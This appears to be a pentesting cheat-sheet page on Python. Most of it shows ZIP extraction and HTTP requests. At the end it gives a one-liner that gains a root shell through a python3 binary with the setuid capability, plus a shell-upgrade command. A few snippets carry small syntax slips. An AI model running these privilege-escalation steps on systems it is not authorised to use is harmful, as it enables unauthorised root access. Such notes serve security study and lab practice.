---
title: Python
desc: A high-level, interpreted, general-purpose programming language.
tags: [Malware, PrivEsc, Web]
alts: []
website:
render_with_liquid: false
---

## Extract

### Extract ZIP Archive

```python
import zipfile

archive = 'example.zip'
output_dir = 'output'

with zipfile.ZipFile(archive, 'r') as z:
	z.extractall(output_dir)
```

### Extract ZIP Archives Recursively

```python
import io
import os
import zipfile

archive = 'example.zip'
output_dir = 'output'

with zipfile.ZipFile(archive, 'r') as z:
	for f in z.namelist():
		# Read inner zip
		content = io.BytesIO(z.read(f))
		with zipfile.ZipFile(content, 'r') as c:
			c.extractall(output_dir)
```

<br />

## Requests

### HTTP GET Request (Basic)

```python
#!/usr/bin/env python3

import requests

ip = '10.0.0.1'
port = '80'
url = 'http://%s:%s' % (ip, port)

res = requests.get(url)

print(res.content)
print(res.headers)
print(res.status_code)
print(res.text)
print(res.url)
```

### HTTP GET Request (Args)

```python
#!/usr/bin/env python3

import requests

ip = '10.0.0.1'
port '80'
url = 'http://%s:%s' % (ip, port)
ua = 'Mozilla/5.0 ...'

# Args
params = {'page': '2', 'item': 'chair'}
headers = {'User-Agent': ua}
cookies = {'PHPSESSID': 'a953b5...'}
auth = requests.auth.HTTPBasicAuth('username', 'password')

r = requests.get(url, params=params, headers=headers, cookies=cookies, auth=auth)

print(r.text)
```

### HTTP GET Request (Session)

```python
#!/usr/bin/env python3

import requests

url = 'http://example.com'

session = requests.Session()
r = session.get(url)

print(r.text)
```

### HTTP POST Request (Basic)

```python
#!/usr/bin/env python3

import requests

ip = '10.0.0.1'
port = '80'
url = 'http://%s:%s/login' % (ip, port)

data = {'username': 'admin', 'password': 'admin'}

r = requests.post(url, data=data)

print(r.status_code)
print(r.text)
```

### HTTP POST Request (Args)

```python
#!/usr/bin/env python3

import requests

url = 'http://example.com/login'

data = {'username': 'admin', 'password': 'admin'}

# Args
headers = {'User-Agent': ua}
cookies = {'PHPSESSID': 'a953b5...'}

r = requests.post(url, data=data, headers=headers, cookies=cookies)
```

### HTTP POST Request (Session)

```python
#!/usr/bin/env python3

import requests

url = 'http://example.com/comment'

data = {'name': 'Mike', 'comment': 'Hello'}

session = requests.Session()

r = session.post(url, data=data)

print(r.text)
```

<br />

## Privilege Escalation

```sh
# Capability
# ex. /usr/bin/python3 = cap_setuid+ep)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<br />

## Upgrade to Full Functional Terminal

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```